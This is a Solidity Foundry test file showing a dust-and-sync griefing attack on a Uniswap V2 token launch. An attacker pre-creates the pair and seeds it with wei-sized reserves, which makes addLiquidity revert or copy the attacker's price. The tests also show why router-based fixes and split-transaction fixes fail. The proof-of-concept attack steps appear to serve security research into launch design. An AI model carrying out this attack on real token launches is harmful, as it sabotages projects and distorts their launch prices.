// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseTest} from "./utils/BaseTest.sol";
import {ITestPair} from "./utils/UniswapV2.sol";

/// @notice Shows the attack on a plain Uniswap V2 launch and why fixing it through the router does not work.
contract AttackTest is BaseTest {
    function setUp() public override {
        super.setUp();
        vm.startPrank(team);
        newToken.approve(address(router), type(uint256).max);
        wbnb.approve(address(router), type(uint256).max);
        vm.stopPrank();
    }

    /// @notice Baseline: without the attack `addLiquidity` creates the pair and sets the target price.
    function test_NormalLaunchWithoutAttack() public {
        vm.prank(team);
        router.addLiquidity(
            address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, AMOUNT_NEW, AMOUNT_WBNB, team, block.timestamp
        );

        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pairOf());
        assertEq(reserveNew, AMOUNT_NEW);
        assertEq(reserveWbnb, AMOUNT_WBNB);
    }

    /// @notice 2 wei of WBNB and `sync()` make every `addLiquidity` call revert.
    function test_AttackBreaksNormalLaunch() public {
        ITestPair pair = attack(2);

        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        assertEq(reserveNew, 0);
        assertEq(reserveWbnb, 2);

        // The router sees non-zero reserves and calls `quote()`, which requires both reserves to be non-zero.
        vm.prank(team);
        vm.expectRevert(bytes("UniswapV2Library: INSUFFICIENT_LIQUIDITY"));
        router.addLiquidity(address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, 0, 0, team, block.timestamp);
    }

    /// @notice If the attacker has a little NEW, dust on both sides makes the router use the attacker's price.
    function test_DustOnBothSidesForcesAttackerPrice() public {
        vm.prank(team);
        newToken.transfer(attacker, 1);

        vm.startPrank(attacker);
        ITestPair pair = ITestPair(factory.createPair(address(newToken), address(wbnb)));
        newToken.transfer(address(pair), 1);
        wbnb.transfer(address(pair), 1);
        pair.sync();
        vm.stopPrank();

        vm.prank(team);
        (uint256 usedNew, uint256 usedWbnb,) =
            router.addLiquidity(address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, 0, 0, team, block.timestamp);

        // The router keeps the 1:1 ratio: 1 NEW = 1 WBNB instead of 0.37.
        assertEq(usedNew, AMOUNT_WBNB);
        assertEq(usedWbnb, AMOUNT_WBNB);
    }

    /// @notice Topping up the dust and calling the router does not give the target price: the router fits the whole
    ///         deposit to the ratio of the dust, and the dust ratio can only be set in whole wei.
    function test_RouterCopiesRoundedDustRatio() public {
        ITestPair pair = attack(2);

        // The exact top-up is 2 * 1000 / 370 = 5.4 wei of NEW. Only whole wei are possible, so the team sends 6.
        vm.startPrank(team);
        newToken.transfer(address(pair), 6);
        pair.sync();
        (uint256 usedNew, uint256 usedWbnb,) =
            router.addLiquidity(address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, 0, 0, team, block.timestamp);
        vm.stopPrank();

        // The router takes WBNB at the 6:2 ratio of the dust: 333.3 WBNB instead of 370.
        assertEq(usedNew, AMOUNT_NEW);
        assertEq(usedWbnb, AMOUNT_NEW * 2 / 6);

        // The launch price is 1 NEW = 0.333 WBNB instead of 0.37, about 10% lower.
        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        assertApproxEqRel(reserveWbnb * 1e18 / reserveNew, 0.3333e18, 0.001e18);
    }

    /// @notice If the dust is fixed in one transaction and liquidity is added in another, the attacker can move the
    ///         price of the dust pool again for almost nothing.
    function test_FixInSeparateTransactionIsGriefedAgain() public {
        ITestPair pair = attack(2);

        // Transaction 1: the team tops up the dust and calls `sync()`. Reserves are (6 NEW, 2 WBNB).
        vm.startPrank(team);
        newToken.transfer(address(pair), 6);
        pair.sync();
        vm.stopPrank();

        // Between the transactions: the attacker swaps 1000 wei of WBNB for 5 wei of NEW.
        vm.startPrank(attacker);
        wbnb.transfer(address(pair), 1000);
        (uint256 amount0Out, uint256 amount1Out) = pair.token0() == address(newToken) ? (5, 0) : (0, 5);
        pair.swap(amount0Out, amount1Out, attacker, "");
        vm.stopPrank();

        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        assertEq(reserveNew, 1);
        assertEq(reserveWbnb, 1002);

        // Transaction 2: `addLiquidity` with 1% slippage reverts. Without the limits it would add at the wrong price.
        vm.prank(team);
        vm.expectRevert(bytes("UniswapV2Router: INSUFFICIENT_A_AMOUNT"));
        router.addLiquidity(
            address(newToken),
            address(wbnb),
            AMOUNT_NEW,
            AMOUNT_WBNB,
            AMOUNT_NEW * 99 / 100,
            AMOUNT_WBNB * 99 / 100,
            team,
            block.timestamp
        );
    }
}
